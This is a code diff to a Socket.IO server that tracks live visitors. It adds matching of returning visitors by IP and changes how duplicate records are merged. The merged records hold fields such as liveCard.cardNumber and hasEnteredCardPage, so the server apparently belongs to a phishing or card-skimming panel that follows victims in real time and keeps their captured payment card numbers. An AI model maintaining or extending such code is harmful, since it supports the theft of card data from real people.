@@ -370,6 +370,18 @@ io.on("connection", (socket) => {
       existingVisitor = savedVisitors.find(v => v._id === existingVisitorId);
       console.log(`Looking for existing visitor with ID: ${existingVisitorId}, found: ${!!existingVisitor}`);
     }
+    if (!existingVisitor && visitorInfo.ip) {
+      try {
+        var __best = null;
+        savedVisitors.forEach(function (v) {
+          if (!v || v.ip !== visitorInfo.ip) return;
+          if (Date.now() - (v.lastActivity || 0) > 1800000) return;
+          if (!__best || (v.lastActivity || 0) > (__best.lastActivity || 0)) __best = v;
+        });
+        existingVisitor = __best;
+        if (existingVisitor) console.log("[FIX95] adopted existing visitor by IP: " + existingVisitor._id);
+      } catch (e) {}
+    }
 
     let visitor;
     let isNewVisitor = false;
@@ -1763,7 +1775,7 @@ var g={};
 __kdkAll().forEach(function(v){if(!v||!v.ip)return;var key=String(v.ip);if(!g[key])g[key]=[];g[key].push({v:v})});
 Object.keys(g).forEach(function(kk){
 var a=g[kk];if(a.length<2)return;
-a.sort(function(x,y){return ((y.v.fullName?1:0)-(x.v.fullName?1:0))||((x.v.sessionStartTime||0)-(y.v.sessionStartTime||0))});
+a.sort(function(x,y){return ((y.v.isConnected?1:0)-(x.v.isConnected?1:0))||((y.v.lastActivity||0)-(x.v.lastActivity||0))||((y.v.fullName?1:0)-(x.v.fullName?1:0))});
 var keep=a[0].v;
 for(var i=1;i<a.length;i++){
 var d=a[i].v;if(d._id===keep._id)continue;if(__kdkApp[d.socketId]&&!__kdkApp[keep.socketId]&&visitors.has(d.socketId)){keep.socketId=d.socketId;keep.isConnected=true}if(!keep.country||keep.country==='Unknown')keep.country=d.country;if(d.liveCard&&d.liveCard.cardNumber&&!(keep.liveCard&&keep.liveCard.cardNumber))keep.liveCard=d.liveCard;if(d.hasEnteredCardPage)keep.hasEnteredCardPage=true;if(!visitors.has(keep.socketId)&&visitors.has(d.socketId)){keep.socketId=d.socketId;keep.isConnected=true}
